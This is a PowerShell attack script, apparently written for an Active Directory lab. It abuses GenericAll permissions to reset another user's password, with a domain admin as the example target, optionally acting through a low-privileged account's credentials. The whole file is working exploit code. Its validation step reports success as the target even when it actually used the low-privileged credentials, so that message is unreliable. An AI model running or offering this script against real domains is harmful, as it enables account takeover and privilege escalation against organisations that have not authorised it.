<#
.SYNOPSIS
Abuses GenericAll rights to reset an AD user's password from a specified low-privileged account.

.DESCRIPTION
If you have GenericAll over a target user, you can reset their password to one you control.
This script supports running as a different account by passing LowPrivUser and optional LowPrivPassword.

.PARAMETER TargetUser
SamAccountName of the target user (e.g., "domainadmin").

.PARAMETER NewPassword
The new password to assign to the target user.

.PARAMETER LowPrivUser
(Optional) SamAccountName of the low-privileged user that has GenericAll over the target.

.PARAMETER LowPrivPassword
(Optional) Password for the LowPrivUser; if omitted, you will be prompted securely.

.EXAMPLE
PS> .\attack_reset_password.ps1 -TargetUser "domainadmin" -NewPassword "Adm!nLab#2025"

.EXAMPLE
PS> .\attack_reset_password.ps1 -TargetUser "domainadmin" -NewPassword "Adm!nLab#2025" -LowPrivUser "lab\lowprivguy"
#>

param(
	[Parameter(Mandatory=$true)]
	[string]$TargetUser,

	[Parameter(Mandatory=$true)]
	[string]$NewPassword,

	[Parameter(Mandatory=$false)]
	[string]$LowPrivUser,

	[Parameter(Mandatory=$false)]
	[string]$LowPrivPassword
)

function Write-Ok
{ param([string]$m) Write-Host "[+] $m" -ForegroundColor Green 
}
function Write-Bad
{ param([string]$m) Write-Host "[-] $m" -ForegroundColor Red 
}
function Write-Info
{ param([string]$m) Write-Host "[*] $m" -ForegroundColor Cyan 
}

# --- Check AD module ---
if (-not (Get-Module -ListAvailable -Name ActiveDirectory))
{
	Write-Bad "ActiveDirectory module not found (install RSAT)."
	exit 1
}
Import-Module ActiveDirectory

# --- Prepare credentials ---
$Creds = $null
if ($LowPrivUser)
{
	if (-not $LowPrivPassword)
	{
		$SecurePass = Read-Host "Enter password for $LowPrivUser" -AsSecureString
	} else
	{
		$SecurePass = ConvertTo-SecureString $LowPrivPassword -AsPlainText -Force
	}
	$Creds = New-Object System.Management.Automation.PSCredential ($LowPrivUser, $SecurePass)
	Write-Info "Using credentials for $LowPrivUser"
} else
{
	Write-Info "Using current user context"
}

# --- Ensure target exists ---
try
{
	$Target = Get-ADUser -Identity $TargetUser -ErrorAction Stop
} catch
{
	Write-Bad "Target user '$TargetUser' not found."
	exit 1
}

# --- Reset password ---
Write-Info "Resetting password for '$TargetUser'..."
try
{
	Set-ADAccountPassword -Identity $TargetUser -NewPassword (ConvertTo-SecureString $NewPassword -AsPlainText -Force) -Reset -Credential $Creds -ErrorAction Stop
	Write-Ok "Password reset to '$NewPassword'"
} catch
{
	Write-Bad "Password reset failed: $($_.Exception.Message)"
	exit 1
}

# --- Validate new password ---
try
{
	$Domain = (Get-ADDomain).DNSRoot
	if (-not $Creds)
	{
		$Creds = New-Object System.Management.Automation.PSCredential(
			("{0}\{1}" -f $Domain, $TargetUser),
			(ConvertTo-SecureString $NewPassword -AsPlainText -Force)
		)
	}
	$null = Get-ADUser -Identity $TargetUser -Credential $Creds -ErrorAction Stop
	Write-Ok "Validation success: authenticated as '$TargetUser' with new password."
	exit 0
} catch
{
	Write-Bad "Validation failed: $($_.Exception.Message)"
	exit 1
}
